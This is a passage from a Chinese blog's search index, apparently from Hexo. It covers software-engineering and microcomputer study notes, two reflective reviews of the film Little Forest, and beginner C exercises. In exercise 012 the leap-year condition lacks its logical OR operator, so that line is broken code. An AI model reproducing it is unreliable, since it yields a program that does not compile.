title="软件工程的原则"></a>软件工程的原则</h4><ul><li>选取适宜的开发模型</li><li>提供高质量的工程支持</li><li>重视开发过程的管理</li></ul><p><img src="https://cos.gjcloak.xyz/file/image-1652659231715.png" alt="image-1652659231715" title="image-1652659231715"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 计算机基础 </tag>
            
            <tag> 软件工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小森林 冬春篇 リトル・フォレスト 冬・春 (2015)</title>
      <link href="/e952043b.html"/>
      <url>/e952043b.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>食物因感知的丰富而更加美味</p></blockquote><p>看完这部电影，就觉得肚子饿极了。到厨房里转了一圈，没找到什么可以填肚子的东西。桌子上有一洗米箩的荸荠，妈妈早上刚买来的。有些人喜欢拿它做菜，我们家基本上都是当水果吃。</p><p>其实之前，我并不是特别喜欢吃这个东西，觉得味道过于平淡。而且说实话，荸荠长得真的不会让人太有想吃的欲望，看上去脏脏的，又很粗糙。但是用刮刀削了皮以后，里面的肉却很白净，水分也很足，咬起来很脆。不知道是不是这部电影的影响，原本觉得滋味平淡的，此时吃起来，却觉得很有滋味，这种平淡的清甜，这是这个季节该有的味道。食后心情大好。</p><p>以前，食物对我来说仅仅是能够让我免于饥饿的东西而已。对食物的味道不太讲究，好吃是一顿，不好吃也是一顿，吃饱就好。看完《小森林》之后，却突然对食物有了另一种感知，开始将食物跟更多的东西建立起联系，比如情感，比如自然，比如四季变幻。</p><p>食物不再只是食物，而吃也不再只是一个对抗饥饿的动物本能行为。当你对食物的感知变得丰富，你的味蕾也会格外活跃起来，食物也就变得更加美味。而吃，也就变成了一种感受生活，享受生活的乐趣。</p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分享 </tag>
            
            <tag> 小森林 </tag>
            
            <tag> 电影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小森林 夏秋篇 リトル・フォレスト 夏・秋 (2014)</title>
      <link href="/ed0c979b.html"/>
      <url>/ed0c979b.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>你是否在心不在焉地生活？</p></blockquote><p>我想说，这是我过去一年中看到的最好的电影，没有之一。<br>绝对治愈系。虽然表面看起来这治愈的力量好像来自自然，实际上却无时无刻不在传递着人性的本真。<br>满满的能量，全部源自对生活的热爱。人生的要义，真真聚焦在了唯美食与梦想不可辜负上。明明满屏都是不言不语的大自然，我却看得满心满眼感动得想哭，是什么把自己惊艳到了呢？<br>认真想了一分钟，发现不过是像空气、泥土、植物一样，纯粹的生活。而这种纯粹，正在我的内心渐行渐远，或者说从来就没有用心地享受过。因为自己，好像从来都是在心不在焉地生活。<br>小时候我也曾经到田间地头去捡过秋收的胡萝卜、土豆、红薯，曾经翘首企盼过树上的果子快快长熟，可是记忆力却没有费力制作过什么美食，也没有像市子一样淋漓尽致地品尝过来自大自然的美味。所以我没有市子那样对生活发自内心的热爱。我想一方面是因为自己那时候挑食，不吃的东西很多；另一方面和成长环境有关，我的妈妈并不像市子的妈妈一样善于利用食材做出各种创新的食物，我的妈妈是一位没什么创造精神的人，但是她学东西很快，做得家常饭菜很香。这里也可见，家庭关系和自我修为对小孩成长的影响极为深刻。不过这里要强调的是，对于纯粹地享受当下的生活这件事，我一直是遗忘的。像上班的时候想着生活，周末了又惦记着一项未完成的工作这样的不纯粹时常发生；懒得费时耗力地做一顿精致的饭菜随手订没有营养的外卖将就着吃；懒得出门走动就借口说外面空气不好宅在家里蹉跎掉大好周末。凡此种种，都是不热爱生活的表现。<br>所以，当看到电影中市子带着尊敬与虔诚地利用自然赐予的食材，精心制作并享用着每一顿可口美味的食物时，我被惊艳了。原来一直被我遗忘掉的生活，可以这样简单和生动。我想今年我会爱上厨房的。</p><p>《小森时光》里影片开头拍摄村庄田间植物生长的镜头，也让我想起了萧红的《初冬》。萧红描写黄瓜爱长成啥样就长成啥样，看到的是自然万物的生长规律，想到的是人的自由生活主张。这一点上，这部电影有异曲同工之妙。影片用一条明线表现着村子里自然原生态生活的纯粹和本真有多美好，同时有一条暗线在表现人们都在暗中较劲争先恐后地远离村子。市子和回乡少年的对话，市子和塑料棚大婶的对话，既反映了时代对村庄的变迁，也反映了个人对生活的选择。故事的矛盾在这里出现。乡下的原生态纯粹美好，可是远离社会的先进多彩；大城市视野丰富节奏快，可是心绪沉重人际复杂。这是一个全球存在的问题，当下的中国也是一样。如果说时代如此，那人能做的唯有选择和坚守。重要的是，努力去过自己想要的生活，并且永远别忘记享受生活最纯粹的一面。</p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分享 </tag>
            
            <tag> 小森林 </tag>
            
            <tag> 电影 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微机原理学习笔记</title>
      <link href="/46.html"/>
      <url>/46.html</url>
      
        <content type="html"><![CDATA[<h2 id="第-0-章-计算机基础知识"><a href="#第-0-章-计算机基础知识" class="headerlink" title="第 0 章 计算机基础知识"></a>第 0 章 计算机基础知识</h2><h3 id="数制与编码"><a href="#数制与编码" class="headerlink" title="数制与编码"></a>数制与编码</h3><h4 id="数制与转换"><a href="#数制与转换" class="headerlink" title="数制与转换"></a>数制与转换</h4><p>1 常用的数制</p><p><strong>十进制数（Decimal）</strong>：0、1、2、3、4、5、6、7、8、9 共 10 个数字符号，逢 10 进 1，<strong>十进制数的后缀是 D，但通常可以省略</strong></p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507204129.png" alt="十进制数" title="十进制数"></p><p><strong>二进制数（Binary）</strong>：只有 0、1 共 2 个数字符号，逢 2 进 1，<strong>二进制数的后缀是 B</strong></p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507204654.png" alt="二进制数" title="二进制数"></p><p><strong>十六进制数（Hexadecimal）</strong>：0、1、2、3、4、5、6、7、8、9、A、B、C、D、E、F 共 16 个数字符号，逢 16 进 1，十六进制的后缀是 H</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507210210.png" alt="十六进制数" title="十六进制数"></p><p>2 进制的作用</p><ul><li>十进制是最熟悉和方便使用的数制</li><li>二进制是计算机使用和方便硬件实现计算的数制</li><li>十六进制和二进制的转换十分方便，作用是用来简化和方便二进制的书写和阅读</li></ul><p>3 数制的转换</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507212010.png" alt="image-20200507212009716" title="image-20200507212009716"></p><p><strong>说明</strong></p><ul><li>1 位十六进制数，可扩展为 4 位二进制数</li><li>4 位二进制数可用 1 位十六进制数表示</li><li>由于不同数制的存在，因此书写数值时，应给出其数制的标识</li></ul><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507212708.png" alt="image-20200507212707317" title="image-20200507212707317"></p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507212931.png" alt="image-20200507212930621" title="image-20200507212930621"></p><h4 id="微机中数的表示"><a href="#微机中数的表示" class="headerlink" title="微机中数的表示"></a>微机中数的表示</h4><p>1 无符号数</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507213203.png" alt="image-20200507213202808" title="image-20200507213202808"></p><p>2 带符号数</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507213227.png" alt="image-20200507213226015" title="image-20200507213226015"></p><p>计算机中的带符号数有三种表示方法：<strong>原码、反码、补码</strong></p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507213629.png" alt="image-20200507213628895" title="image-20200507213628895"></p><p>由上面可知：对于带符号数中的<strong>负数</strong>，反码是原码取反，补码是反码 + 1，或原码取反 + 1</p><p><strong>说明</strong></p><ul><li>原码的表示范围：-127 —— +127D</li><li>反码的表示范围：-127 —— +127D</li><li>补码的表示范围：-128 —— +127D</li></ul><h4 id="二进制编码"><a href="#二进制编码" class="headerlink" title="二进制编码"></a>二进制编码</h4><p>1 BCD 码</p><p>用二进制表示的十进制数（Binary Coded Decimal），简称为 BCD 码，是用 4 位二进制数给 0 - 9 这 10 个数字编码。</p><p>2 BCD 码与十进制数的转换</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507215228.png" alt="image-20200507215223468" title="image-20200507215223468"></p><p>{cat_tips_A}各数制对照表{&#x2F;cat_tips_A}</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507215525.png" alt="image-20200507215523768" title="image-20200507215523768"></p><p>3 字母与字符的编码</p><p>ASCII 码，对 128 个字符进行了编码</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507215640.png" alt="image-20200507215638926" title="image-20200507215638926"></p><h3 id="微机基本组成电路"><a href="#微机基本组成电路" class="headerlink" title="微机基本组成电路"></a>微机基本组成电路</h3><h4 id="常用逻辑电路"><a href="#常用逻辑电路" class="headerlink" title="常用逻辑电路"></a>常用逻辑电路</h4><p>1 与门：是能够实现<strong>逻辑乘法运算</strong>的多端输入、单端输出的逻辑电路</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507221018.png" alt="image-20200507221017738" title="image-20200507221017738"></p><p>2 或门：是能够实现<strong>逻辑加法运算</strong>的多端输入、单端输出的逻辑电路</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507221145.png" alt="image-20200507221144884" title="image-20200507221144884"></p><p>3 非门（反相器）：是能够实现<strong>逻辑非（求反）运算</strong>的单端输入、单端输出的逻辑电路</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507221711.png" alt="image-20200507221710084" title="image-20200507221710084"></p><p>4 异或门：是能够实现<strong>逻辑异或运算</strong>的多端输入、单端输出的逻辑电路</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507221828.png" alt="image-20200507221827619" title="image-20200507221827619"></p><p>5 与非门：是能够实现<strong>逻辑与非运算</strong>的多端输入、单端输出的逻辑电路</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507222052.png" alt="image-20200507222051413" title="image-20200507222051413"></p><p>6 或非门：是一个能够完成<strong>逻辑或非运算</strong>的多端输入、单端输出的逻辑电路</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507222202.png" alt="image-20200507222201619" title="image-20200507222201619"></p><p>{cat_tips_A}常见的逻辑电路真值表{&#x2F;cat_tips_A}</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507222318.png" alt="image-20200507222317430" title="image-20200507222317430"></p><h4 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h4><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507222628.png" alt="image-20200507222627608" title="image-20200507222627608"></p><p>1 R - S 触发器</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507222938.png" alt="image-20200507222937624" title="image-20200507222937624"></p><p>2 D 触发器</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507223009.png" alt="image-20200507223008746" title="image-20200507223008746"></p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507223059.png" alt="image-20200507223058168" title="image-20200507223058168"></p><h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507223212.png" alt="image-20200507223211478" title="image-20200507223211478"></p><p>1 缓冲寄存器（Buffer）：常用来暂存数据</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200507223316.png" alt="image-20200507223315573" title="image-20200507223315573"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] 浙江大学 - 王晓萍 - 微机原理与接口技术（<a href="https://www.bilibili.com/video/BV1Yt411V7xT">:seedling: 视频学习入口</a>）</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 微机原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 语言上机笔记</title>
      <link href="/45.html"/>
      <url>/45.html</url>
      
        <content type="html"><![CDATA[<h2 id="001-屏幕输出指定信息"><a href="#001-屏幕输出指定信息" class="headerlink" title="001 屏幕输出指定信息"></a>001 屏幕输出指定信息</h2><p>【题目】要求再屏幕上输出以下一行信息</p><p>This is a C program.</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    printf(&quot;This is a C program.\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="002-求两个整数之和"><a href="#002-求两个整数之和" class="headerlink" title="002 求两个整数之和"></a>002 求两个整数之和</h2><p>【题目】a + b &#x3D; ?</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int a,b,sum;</span><br><span class="line">    a = 123;</span><br><span class="line">    b = 456;</span><br><span class="line">    sum = a + b;</span><br><span class="line">    printf(&quot;sum = %d\n&quot;,sum); </span><br><span class="line">    return 0;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="003-求两个整数中较大者"><a href="#003-求两个整数中较大者" class="headerlink" title="003 求两个整数中较大者"></a>003 求两个整数中较大者</h2><p>【题目】求两个整数中较大者</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int max(int x,int y);</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int a,b,c;</span><br><span class="line">    scanf(&quot;%d,%d&quot;,&amp;a,&amp;b);</span><br><span class="line">    c = max(a,b);</span><br><span class="line">    printf(&quot;max = %d\n&quot;,c);</span><br><span class="line">    return 0;</span><br><span class="line">&#125; </span><br><span class="line">//求两个整数中较大者 </span><br><span class="line">int max(int x,int y)&#123;</span><br><span class="line">    return x&gt;y?x:y; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="004-求三个整数中的最大者"><a href="#004-求三个整数中的最大者" class="headerlink" title="004 求三个整数中的最大者"></a>004 求三个整数中的最大者</h2><p>【题目】编写一个 C 程序，输入 a，b，c 三个整数，输出其中最大者</p><p>【代码】</p><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int max(int x,int y,int z);</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int a,b,c,d;</span><br><span class="line">    scanf(&quot;%d,%d,%d&quot;,&amp;a,&amp;b,&amp;c);</span><br><span class="line">    d = max(a,b,c);</span><br><span class="line">    printf(&quot;max = %d\n&quot;,d);</span><br><span class="line">    return 0;</span><br><span class="line">&#125; </span><br><span class="line">//求3个整数中较大者 </span><br><span class="line">int max(int x,int y,int z)&#123;</span><br><span class="line">    int t;</span><br><span class="line">    if(x&gt;y) &#123;</span><br><span class="line">        if(x&gt;z)&#123;</span><br><span class="line">            t = x;</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            t = z;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else if(y&lt;z)&#123;</span><br><span class="line">            t = z;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            t = y;</span><br><span class="line">        &#125;</span><br><span class="line">    return t; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 02：对 01 代码进行了优化</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int max(int x,int y,int z);</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int a,b,c,d;</span><br><span class="line">    scanf(&quot;%d,%d,%d&quot;,&amp;a,&amp;b,&amp;c);</span><br><span class="line">    d = max(a,b,c);</span><br><span class="line">    printf(&quot;max = %d\n&quot;,d);</span><br><span class="line">    return 0;</span><br><span class="line">&#125; </span><br><span class="line">//求3个整数中较大者 </span><br><span class="line">int max(int x,int y,int z)&#123;</span><br><span class="line">    int max = x;</span><br><span class="line">    if(max&lt;y)&#123;</span><br><span class="line">        max = y;</span><br><span class="line">    &#125;</span><br><span class="line">    if(max&lt;z)&#123;</span><br><span class="line">        max = z;</span><br><span class="line">    &#125;</span><br><span class="line">    return max; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="005-求1×2×3×4×5"><a href="#005-求1×2×3×4×5" class="headerlink" title="005 求1×2×3×4×5"></a>005 求1×2×3×4×5</h2><p>【题目】求1×2×3×4×5</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int factorial(int n);</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int result;</span><br><span class="line">    result = factorial(5); </span><br><span class="line">    printf(&quot;1×2×3×4×5 = %d\n&quot;,result);</span><br><span class="line">    return 0;</span><br><span class="line">&#125; </span><br><span class="line">//求1×2×3×4×5 (5! 阶乘)</span><br><span class="line">int factorial(int n)&#123;</span><br><span class="line">    int i=2,t=1;</span><br><span class="line">    while(i&lt;=n)&#123;</span><br><span class="line">        t *= i;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return t; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="006-求多项式1-1-2-1-3-1-4-…-1-99-1-100"><a href="#006-求多项式1-1-2-1-3-1-4-…-1-99-1-100" class="headerlink" title="006 求多项式1-1&#x2F;2+1&#x2F;3-1&#x2F;4+…+1&#x2F;99-1&#x2F;100"></a>006 求多项式1-1&#x2F;2+1&#x2F;3-1&#x2F;4+…+1&#x2F;99-1&#x2F;100</h2><p>【题目】求多项式1-1&#x2F;2+1&#x2F;3-1&#x2F;4+…+1&#x2F;99-1&#x2F;100</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">double sum(int n);</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    printf(&quot;%lf\n&quot;,sum(100));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">double sum(int n)&#123;</span><br><span class="line">    int sign = 1;</span><br><span class="line">    double result = 1.0;</span><br><span class="line">    int i = 2;</span><br><span class="line">    while(i&lt;=n)&#123;</span><br><span class="line">        sign = -sign;</span><br><span class="line">        result += (double)sign/i;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="007-输出给定小写字母"><a href="#007-输出给定小写字母" class="headerlink" title="007 输出给定小写字母"></a>007 输出给定小写字母</h2><p>【题目】给定一个大写字母，要求用小写字母输出</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char c1,c2;</span><br><span class="line">    c1 = &#x27;A&#x27;;</span><br><span class="line">    c2 = c1 + 32;</span><br><span class="line">    printf(&quot;%c\n&quot;,c2);</span><br><span class="line">    printf(&quot;%d\n&quot;,c2);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="008-从键盘输入字符输出"><a href="#008-从键盘输入字符输出" class="headerlink" title="008 从键盘输入字符输出"></a>008 从键盘输入字符输出</h2><p>【题目】从键盘输入BOY 3个字符，然后把他们输出到屏幕</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char a,b,c;</span><br><span class="line">    a = getchar();</span><br><span class="line">    b = getchar();</span><br><span class="line">    c = getchar();</span><br><span class="line">    putchar(a);</span><br><span class="line">    putchar(b);</span><br><span class="line">    putchar(c);</span><br><span class="line">    putchar(&#x27;\n&#x27;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="009-输出任意小写字母"><a href="#009-输出任意小写字母" class="headerlink" title="009 输出任意小写字母"></a>009 输出任意小写字母</h2><p>【题目】<code>改写 007</code>，从键盘上输入一个大写字母，在显示屏上显示对应的小写字母</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char c1,c2;</span><br><span class="line">    c1 = getchar();</span><br><span class="line">    c2 = c1 + 32;</span><br><span class="line">    putchar(c2);</span><br><span class="line">    putchar(&#x27;\n&#x27;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="010-判别是否为大写字母"><a href="#010-判别是否为大写字母" class="headerlink" title="010 判别是否为大写字母"></a>010 判别是否为大写字母</h2><p>【题目】输入一个字符，判别它是否为大写字母，如果是，将它转换成小写字母；如果不是，则不转换。然后输出最后得到的字符</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char c;</span><br><span class="line">    scanf(&quot;%c&quot;,&amp;c);</span><br><span class="line">    c = (c&gt;=&#x27;A&#x27;&amp;&amp;c&lt;=&#x27;Z&#x27;)?(c+32):c;</span><br><span class="line">    printf(&quot;%c\n&quot;,c); </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="011-成绩按等级输出"><a href="#011-成绩按等级输出" class="headerlink" title="011 成绩按等级输出"></a>011 成绩按等级输出</h2><p>【题目】要求按照考试成绩的等级输出百分制分数段，A等为85分以上，B等为70 ~ 84，C等60 ~ 69，D等为60分以下。成绩的等级由键盘输入</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char grade;</span><br><span class="line">    scanf(&quot;%c&quot;,&amp;grade);</span><br><span class="line">    printf(&quot;Your score：&quot;);</span><br><span class="line">    switch(grade)&#123;</span><br><span class="line">        case &#x27;A&#x27;: printf(&quot;85-100\n&quot;);break;</span><br><span class="line">        case &#x27;B&#x27;: printf(&quot;70-84\n&quot;);break;</span><br><span class="line">        case &#x27;C&#x27;: printf(&quot;60-69\n&quot;);break;</span><br><span class="line">        case &#x27;D&#x27;: printf(&quot;&lt;60\n&quot;);break;</span><br><span class="line">        default:  printf(&quot;enter data error！\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="012-判断闰年"><a href="#012-判断闰年" class="headerlink" title="012 判断闰年"></a>012 判断闰年</h2><p>【题目】写一程序，判断某一年是否为闰年</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;stdbool.h&gt;</span><br><span class="line"></span><br><span class="line">bool isLeap(int year);</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int year;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;year);</span><br><span class="line">    if(isLeap(year))&#123;</span><br><span class="line">        printf(&quot;%d is &quot;,year);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        printf(&quot;%d is not &quot;,year);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;a leap year.\n&quot;);</span><br><span class="line">     </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool isLeap(int year)&#123;</span><br><span class="line">    bool leap = false;</span><br><span class="line">    if((year%4==0 &amp;&amp; year%100!=0)(year%400==0))&#123;</span><br><span class="line">        leap = true;</span><br><span class="line">    &#125;</span><br><span class="line">    return leap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="013-求1-2-3-…-100"><a href="#013-求1-2-3-…-100" class="headerlink" title="013 求1+2+3+…+100"></a>013 求1+2+3+…+100</h2><p>【题目】</p><p>【代码】</p><ul><li>Example 01：[ while 语句实现 ]</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span 